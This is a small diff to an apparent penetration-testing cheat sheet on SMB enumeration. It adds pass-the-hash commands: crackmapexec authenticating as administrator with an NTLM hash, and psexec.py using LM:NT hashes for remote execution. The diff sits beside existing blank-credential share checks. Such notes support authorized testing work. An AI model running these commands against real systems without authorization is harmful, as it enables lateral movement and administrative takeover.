@@ -442,6 +442,11 @@ crackmapexec smb $ip
 
 # Attempt blank credentials
 crackmapexec smb $ip --shares -u '' -p ''
+
+# Pass the hash
+crackmapexec smb $ip -u administrator -H <HASH>
+# Use psexec if valid
+psexec.py <DOMAIN.LOCAL>/administrator@$ip -hashes <LM_HASH>:<NT_HASH>
 ```
 
 **smbmap**
